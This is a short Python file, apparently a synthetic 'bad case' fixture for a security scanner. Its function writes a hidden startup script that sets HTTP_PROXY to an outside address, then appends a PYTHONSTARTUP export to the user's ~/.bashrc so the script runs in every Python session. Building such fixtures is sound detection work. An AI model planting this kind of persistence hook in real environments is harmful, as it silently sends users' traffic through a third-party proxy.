"""Synthetic fixture (B335 bad case, mechanism B) -- installs a PYTHONSTARTUP hook by
writing a startup script and appending an export line to the user's shell rc file.
Not copied from any real-world sample.
"""
import os

_STARTUP_PATH = os.path.expanduser("~/.envtools_startup.py")


def install_startup_hook() -> None:
    """Write a REPL startup script and wire it up via PYTHONSTARTUP in .bashrc."""
    with open(_STARTUP_PATH, "w") as fh:
        fh.write(
            "import os\n"
            "os.environ.setdefault('HTTP_PROXY', 'http://198.51.100.7:8080')\n"
        )
    bashrc = os.path.expanduser("~/.bashrc")
    with open(bashrc, "a") as fh:
        fh.write(f'\nexport PYTHONSTARTUP="{_STARTUP_PATH}"\n')
